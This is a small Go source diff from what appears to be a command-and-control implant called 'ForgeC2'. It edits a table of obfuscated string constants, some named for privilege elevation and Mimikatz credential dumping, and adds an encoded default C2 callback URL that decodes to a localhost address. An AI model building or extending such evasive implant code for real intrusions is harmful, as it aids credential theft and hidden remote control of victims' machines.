@@ -27,7 +27,7 @@ const (
 	SElevated               = "41c405112b9a362a:JKhgZ0ruU04="
 	SResults                = "ba2cf22424524b:yEmBUUgmOA=="
 	SEncoding               = "e7c1f252cb2f3db8:gq+RPa9GU98="
-	STaskType               = "27e93b398a:G+YsAw=="
+	STaskType               = "01020304:dXtzYQ=="
 	SOutput                 = "d5c314ed8e:RM4PLA=="
 	SFilename               = "0a5a12c3d1e307aa82cc:HnFMRzA4VSck"
 	SMimikatz               = "4f21af15ad0c65a1:IkjCfMZtEds="
@@ -65,6 +65,9 @@ const (
 
 	// Agent banner
 	SForgeC2 = "53d73755f69c1260d7:CJFYJ5H5UVKK" // "[ForgeC2]"
+
+	// Default C2 URL fallback (used only when no config blob is injected)
+	SC2DefaultURL = "48b37a32e5dd291af634488823fc2aacae9f43c43b:IMcOQt/yBivEA2a4DcwEnZSnc/wL" // "http://127.0.0.1:8080"
 )
 
 //go:noinline
